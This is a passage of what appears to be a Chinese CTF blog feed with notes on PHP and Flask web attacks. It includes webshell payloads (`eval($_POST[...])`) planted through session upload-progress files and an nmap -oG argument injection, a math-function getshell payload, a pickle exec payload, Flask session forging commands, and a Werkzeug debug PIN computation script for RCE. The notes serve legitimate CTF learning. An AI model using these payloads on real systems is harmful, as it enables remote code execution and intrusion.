<br>&#125;<br>file = &#123;<br>    <span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-string">&#x27;fakeFile&#x27;</span><br>&#125;<br>cookies = &#123;<br>    <span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: <span class="hljs-string">&#x27;aaa&#x27;</span><br>&#125;<br>response = requests.post(url=url, data=data, files=file, cookies=cookies)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><p>最终session文件中内容为 <code>...upload_progress_&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;...</code></p><p>配置要求：<br><strong>session.upload_progress.enabled &#x3D; on</strong><br><strong>session.upload_progress.name &#x3D; “PHP_SESSION_UPLOAD_PROGRESS”</strong> (默认值)<br>session.use_strict_mode &#x3D; 0 (默认值)  || session.auto_start &#x3D; 1 (非默认值) || 代码中执行session_start() || 都不满足好像也可以。。。<br>session.upload_progress.cleanup &#x3D; off (默认开启，否则需要进行条件竞争)<br>session.upload_progress.prefix &#x3D; “upload_progress_” (不重要)</p><p>原理：<br><a href="https://www.freebuf.com/articles/web/288430.html">文章 :)</a></p><p>当session.use_strict_mode &#x3D; 0时可以手动设置Cookie中的PHPSESSID，从而达到自定义文件名的效果, 此时必须手动设置PHPSESSID，否则不会生成session文件<br>当session.use_strict_mode &#x3D; 1时，依赖与服务器自动创建session文件(上传文件时)，在手动随机设置PHPSESSID后，响应中会返回PHPSESSID的值<br>当上传一个文件时，若session.upload_progress.enabled &#x3D; on 指示跟踪文件上传过程信息，session.upload_progress.name指示从哪个(POST)变量中获取并写入信息，session.upload_progress.prefix指示写入的信息的前缀</p><p>如果session.use_strict_mode &#x3D; 0 &amp;&amp; session.upload_progress.cleanup &#x3D; on时，需要从响应中获取PHPSESSID，但是等你获取到了PHPSESSID，session文件已经被清空了，这时就不能成功包含session文件</p><p><strong>session文件路径</strong><br>常见路径：<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID<br>配置：<br>session.save_path</p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>flask session伪造</title>
    <link href="/blogs/flask/flask-session%E4%BC%AA%E9%80%A0/"/>
    <url>/blogs/flask/flask-session%E4%BC%AA%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<p>flask框架中的session由三部分组成</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># session示例</span><br><span class="hljs-attribute">eyJhZG1pbiI6MH0</span>.Z4TvGQ.<span class="hljs-number">6</span>pZj4EsHiALdBjTc_STIl9XRU5Q<br></code></pre></td></tr></table></figure><p><strong>第一部分</strong>是base64编码的结果, 这里解码后就是</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>第二部分</strong> 时间戳，说明session时间长会过期<br><strong>第三部分</strong><br>对数据和时间戳hmac</p><p>session工作流程</p><ol><li>用户访问，服务端给标示（如{“admin”:0}）、uid，对这些数据进行认证，附加到session字符串中</li><li>用户带着session字符串访问服务端，服务器对session进行认证，与原有mac进行比较。相同则认证成功。</li></ol><p>解题流程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">flask-unsign -d -c COOKIE<br>flask-unsign -s -c COOKIE --secret SECRET<br></code></pre></td></tr></table></figure><p>或者用<a href="https://github.com/mekrina/flask-unsign-gui.git">GUI版</a></p>]]></content>
    
    
    <categories>
      
      <category>flask</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>php特性</title>
    <link href="/blogs/php/php%E7%89%B9%E6%80%A7/"/>
    <url>/blogs/php/php%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="mt-rand破解"><a href="#mt-rand破解" class="headerlink" title="mt_rand破解"></a>mt_rand破解</h2><p><a href="https://buuoj.cn/challenges#[GWCTF%202019]%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96">buu 枯燥的抽奖</a></p><p>利用工具php_mt_seed, 可以根据获取的随机数的值反推种子</p><p>用法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 通过第一次运行的精确值获取种子</span><br>./php_mt_seed first_mt_rand_result <span class="hljs-comment">#(如1684924762)</span><br><span class="hljs-comment"># 通过第一次运行的值的区间获取符合要求的种子</span><br>./php_mt_seed min max <span class="hljs-comment"># ./php_mt_seed 1684924762 1684924762 相当于 ./php_mt_seed 1684924762</span><br><span class="hljs-comment"># 指定第一次运行的值的区间 (min max)同时指定 mt_rand 的区间(MIN MAX)（如php代码中通过mt_rand(0, 10)获取0-10范围内的随机数）</span><br>./php_mt_seed min max MIN MAX<br><br><span class="hljs-comment"># 指定多次运行的结果</span><br>./php_mt_seed (min max MIN MAX) (min max MIN MAX) (min max MIN MAX) (min max MIN MAX)<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-number">12328322</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>();<br></code></pre></td></tr></table></figure><p>执行.&#x2F;php_mt_seed 1684924762<br>得到结果<img src="/blogs/../images/php_mt_seed_test1.png" alt="php_mt_seed_test1.png"><br>成功破解，不同版本的php结果不一样， 验证时注意版本！！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">75930597</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">10</span>;<span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-number">61</span>).<span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/blogs/../images/php_mt_seed_test1.png" alt="php_mt_seed_test2.png"></p><h2 id="mb-strpos和mb-substr行为不一致"><a href="#mb-strpos和mb-substr行为不一致" class="headerlink" title="mb_strpos和mb_substr行为不一致"></a>mb_strpos和mb_substr行为不一致</h2><p><code>%9f</code>, mb_strpos会忽略, 而mb_substr不会<br><code>%f0abc</code>，mb_strpos认为是4个字节，mb_substr认为是1个字节<br><code>%f0%9fab</code>,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节<br><code>%f0%9f%9fa</code>,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节</p><h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h2><p>php中preg_match匹配结尾允许有一个换行符，可以理解为$会匹配一个换行符,但是不会放到$matches里面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$subject</span> = <span class="hljs-string">&quot;a\n&quot;</span>;<br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^a$/&#x27;</span>, <span class="hljs-variable">$subject</span>, <span class="hljs-variable">$matches</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$matches</span>);<br></code></pre></td></tr></table></figure><p>这里的preg_match会匹配成功，结果是<code>string(1) &quot;a&quot;</code></p><p>但是如果有多个<code>\n</code>,则无法匹配.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$subject</span> = <span class="hljs-string">&quot;a\n\n&quot;</span>;<br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^a$/&#x27;</span>, <span class="hljs-variable">$subject</span>, <span class="hljs-variable">$matches</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$matches</span>);<br></code></pre></td></tr></table></figure><p><code>$matches</code>是空数组</p><h2 id="others"><a href="#others" class="headerlink" title="others"></a>others</h2><ol><li><code>$_GET&#123;1&#125;</code>会抛出警告，在vscode中报syntax error，但是也能够运行、使用</li></ol><p><span id="参数名被过滤"></span></p><h2 id="参数名被过滤"><a href="#参数名被过滤" class="headerlink" title="参数名被过滤"></a>参数名被过滤</h2><p>传递参数时，参数前的空格和‘+’会被删除，参数中的特殊字符会被替换成下划线，参数后的null字符会被删除，处理完之后php才会将其保存在数组中。有时需要传递的参数名被过滤，此时可以传递等价参数。<br>![[..&#x2F;images&#x2F;php变量保存替换非法字符.png]]<br>(可能有的字符现在已经不会被替换了，如+)</p><p>如果要传递的参数中有<code>.</code>等非法字符时，比如<code>show_show.show</code>,可以传递<code>show[show.show</code>,遇到中括号并且转化以后就不会继续往后转化了.(php_version &lt; 8)</p><p><span id="过滤特殊字符"></span></p><h2 id="过滤特殊字符"><a href="#过滤特殊字符" class="headerlink" title="过滤特殊字符"></a>过滤特殊字符</h2><p>可以使用system(chr(60).chr(63).chr(61).chr(64).chr(101).chr(118).chr(97))<br>这种形式绕过</p><p>system等命令函数被禁止使用时（可能在配置文件中偷偷设置），可以用scandir函数代替ls，用file_get_contents代替cat</p><h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><ol><li><p>弱类型比较时，用0e开头的md5即可：<br> QNKCDZO    240610708</p></li><li><p>0e开头，md5还是0e开头的字符串</p></li><li><p>强类型比较（弱类型比较也可以用），可以用数组绕过的方法：<br> 因为对数组进行md5，只是警告，不会抛出错误，返回NULL，因此两个参数都传递数组即可。<br> ![[Pasted image 20250119164628.png]]</p><p> 或payload<br> a. <code>psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2</code><br> b.<br> <code>psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2</code><br> 或<br> m.<br> <code>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</code><br> n.<br> <code>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</code><br> sha1强碰撞例子:<br> s.<br> <code>%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</code><br> d.<br> <code>%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</code></p></li></ol><p>例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123; <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>传递?param1[0]&#x3D;0&amp;param2[0]&#x3D;2</p><h2 id="escapeshellarg、escapeshellcmd"><a href="#escapeshellarg、escapeshellcmd" class="headerlink" title="escapeshellarg、escapeshellcmd"></a>escapeshellarg、escapeshellcmd</h2><p><a href="https://buuoj.cn/challenges#[BUUCTF%202018]Online%20Tool">题目链接 buu oneline tool</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$host</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$host</span>);<br><span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$host</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="hljs-variable">$host</span>);<br></code></pre></td></tr></table></figure><p>payload &#x3D; <code>&#39; &lt;?php eval($_POST[&quot;cmd&quot;]);?&gt; -oG 1.php &#39;</code></p><p>-oG是nmap的参数,用于日志记录<br>最终1.php中结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># Nmap 7.70 scan initiated Thu Jan 23 03:31:11 2025 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oG 2.php \ &lt;?php eval($_POST[a]);?&gt; \\</span><br><span class="hljs-comment"># Nmap done at Thu Jan 23 03:31:11 2025 -- 0 IP addresses (0 hosts up) scanned in 0.06 seconds</span><br></code></pre></td></tr></table></figure><p>escapeshellarg后, host &#x3D; <code>&#39;&#39;\&#39;&#39; &lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39;\&#39;&#39;&#39;</code><br>其中<code>&#39;</code>变成了<code>\&#39;</code>之后再在两边加上引号<code>&#39;\&#39;&#39;</code>,最后在整个字符串外边加上<code>&#39;&#39;</code></p><p>escapeshellcmd后, host &#x3D; <code>&#39;&#39;\\&#39;&#39; \&lt;\?php eval\(\$_POST\[&quot;a&quot;\]\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39;&#39;</code>, 被传入system函数中当做命令执行, <code>&#39;&#39;</code>是空字符<code>\\</code>转义成<code>\</code>, <code>\&lt;</code>转义成<code>&lt;</code>,其他同理.<br>最后写入1.php中的内容是:<br><code>\ &lt;?php eval($_POST[a]);?&gt; \\</code><br>可以用<code>a</code>作为密码连接</p><h2 id="hex2bin"><a href="#hex2bin" class="headerlink" title="hex2bin"></a>hex2bin</h2><p>hex2bin不是把16进制变成2进制数值，而是变成字符串<br>比如<code>hex2bin(73797374656d)</code>结果是system<br>bin2hex同理</p><h2 id="base-convert"><a href="#base-convert" class="headerlink" title="base_convert"></a>base_convert</h2><p>可以通过十进制与36进制的转化得到0-9a-z中的任意字符<br>如<code>base_convert(1751504350,10,36)</code>得到system</p><p>尽管eval中只能使用数学函数，仍然可以getshell</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;1&#125;($$pi&#123;2&#125;)</code><br>$pi是<code>_GET</code></p><h2 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h2><p>这个变量中存储了包括GET、POST的变量，可能还有Cookie(默认不包括)</p><p>按照ini_get(‘request_order’)的配置（默认为GP）<br>这个设置指示了PHP 将 GET、POST 和 Cookie 变量注册到 _REQUEST 数组中的顺序。<br>注册是从左到右完成的，新值覆盖旧值。</p><p>当GET、POST变量重名时，GET的变量会被POST变量覆盖</p><p>由此可以绕过waf：(当仅需用GET变量时)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf1</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;waf1&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="SERVER-‘QUERY-STRING’"><a href="#SERVER-‘QUERY-STRING’" class="headerlink" title="$_SERVER[‘QUERY_STRING’]"></a>$_SERVER[‘QUERY_STRING’]</h2><p>即使在burpsuite里面访问<code>/?a=1%2b1</code>，$_SERVER[‘QUERY_STRING’]的值都会是<code>a=1%2b1</code>,即完全不解码.而$_GET数组里的a会是1+1.<br>由于二者的不一致性</p><h2 id="SERVER-‘PHP-SELF’"><a href="#SERVER-‘PHP-SELF’" class="headerlink" title="$_SERVER[‘PHP_SELF’]"></a>$_SERVER[‘PHP_SELF’]</h2><p>比如 <code>http://localhost/index.php</code> 下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]))<br></code></pre></td></tr></table></figure><p>可以通过访问<code>http://localhost/index.php/flag.php</code><br>获取同目录下的<code>flag.php</code></p><p>这是由于浏览器解析到<code>index.php</code>之后就不把后面的路径当做服务的路径了,而是当做<code>PATH_INFO</code><br>而<code>$_SERVER[&#39;PHP_SELF&#39;]</code>的值会是<code>/index.php/flag.php</code>, 所以highlight的是flag</p><h2 id="basename"><a href="#basename" class="headerlink" title="basename"></a>basename</h2><p><a href="https://www.cnblogs.com/yesec/p/15429527.html">文章</a></p><p>会忽略文件名开头的不可见字符,并且如果最后的结果只有中文或者不可见字符, 会往前一个目录</p><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;/Br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><p>测试</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sas">http://localhost/?<span class="hljs-keyword">file</span>=<span class="hljs-title function_">%ffindex</span>.php/<span class="hljs-title function_">%ff</span><br>//<span class="hljs-keyword">index</span>.php<br>http://localhost/?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">index</span>.php/任意中文<br>//<span class="hljs-keyword">index</span>.php<br></code></pre></td></tr></table></figure><p>php版本8.1.2似乎已经被修复</p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>flask debug模式</title>
    <link href="/blogs/flask/flask-debug%E6%A8%A1%E5%BC%8F/"/>
    <url>/blogs/flask/flask-debug%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="通过报错回显"><a href="#通过报错回显" class="headerlink" title="通过报错回显"></a>通过报错回显</h2><p>当可以命令执行，但是无回显且机器不出网时，可以通过报错回显。以一个pickle反序列化的题目为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Email</span>():<br>email = <span class="hljs-string">&quot;admin@admin.com&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read())&quot;</span>,))<br></code></pre></td></tr></table></figure><p>python中exec相当于php的eval，可以用于在当前进程中执行python代码。<br>这里主动抛出错误，错误内容是要获取的值，从而在报错信息中得到flag</p><h2 id="计算pin码进行RCE"><a href="#计算pin码进行RCE" class="headerlink" title="计算pin码进行RCE"></a>计算pin码进行RCE</h2><ol><li>服务器运行flask所登录的用户名。 通过读取&#x2F;etc&#x2F;passwd获得</li><li>module name 一般不变就是flask.app</li><li>getattr(app, “name”, app.class.name)。python该值一般为Flask值一般不变</li><li>flask库下app.py的绝对路径。通过报错信息就会泄露该值。</li><li>mac地址的十进制数。通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address获得</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;1e:eb:d7:36:97:1e&#x27;</span>));<br></code></pre></td></tr></table></figure><ol start="6"><li>机器的id。<br> linux<br> &#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i<br> docker<br> &#x2F;proc&#x2F;self&#x2F;cgroup：</li></ol><p>pin码计算脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br> <br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;flaskweb&#x27;</span>  <span class="hljs-comment"># username</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,  <span class="hljs-comment"># modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,  <span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>  <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br> <br>private_bits = [<br>    <span class="hljs-string">&#x27;170380142167213&#x27;</span>,  <span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span><br>    <span class="hljs-string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span>  <span class="hljs-comment"># get_machine_id(), /etc/machine-id</span><br>]<br> <br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span 